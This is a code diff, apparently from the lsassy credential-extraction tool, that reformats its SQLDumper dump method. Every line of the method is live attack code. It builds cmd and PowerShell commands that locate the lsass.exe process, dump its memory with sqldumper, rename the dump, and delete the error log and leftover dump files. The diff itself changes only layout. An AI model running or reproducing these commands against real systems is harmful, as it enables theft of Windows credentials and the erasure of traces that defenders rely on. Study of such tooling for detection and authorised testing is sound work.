@@ -1,4 +1,4 @@
-from lsassy.dumpmethod import IDumpMethod, Dependency
+from lsassy.dumpmethod import Dependency, IDumpMethod
 
 
 class DumpMethod(IDumpMethod):
@@ -19,15 +19,23 @@ class DumpMethod(IDumpMethod):
         And removing existing .mdmp files is necessary so that we can rename the dump file to our known dump_name.
         """
         cmd_command = """ECHO "" > {}SQLDmpr1337.mdmp & DEL {}SQLDmpr*.mdmp & for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {} %J 0 0x01100:40 0 {} & MOVE {}SQLDmpr0001.mdmp {}{} & DEL {}SQLDUMPER_ERRORLOG.log""".format(
-            self.dump_path, self.dump_path, self.sqldumper.get_remote_path(),
-            self.dump_path, self.dump_path, self.dump_path, self.dump_name, self.dump_path
+            self.dump_path,
+            self.dump_path,
+            self.sqldumper.get_remote_path(),
+            self.dump_path,
+            self.dump_path,
+            self.dump_path,
+            self.dump_name,
+            self.dump_path,
         )
         pwsh_command = """DEL {}SQLDmpr*.mdmp; {} (Get-Process lsass).Id 0 0x01100:40 0 {}; Move-Item {}SQLDmpr0001.mdmp {}{}; DEL {}SQLDUMPER_ERRORLOG.log""".format(
-            self.dump_path, self.sqldumper.get_remote_path(),
-            self.dump_path, self.dump_path, self.dump_path, self.dump_name, self.dump_path
+            self.dump_path,
+            self.sqldumper.get_remote_path(),
+            self.dump_path,
+            self.dump_path,
+            self.dump_path,
+            self.dump_name,
+            self.dump_path,
         )
 
-        return {
-            "cmd": cmd_command,
-            "pwsh": pwsh_command
-        }
+        return {"cmd": cmd_command, "pwsh": pwsh_command}
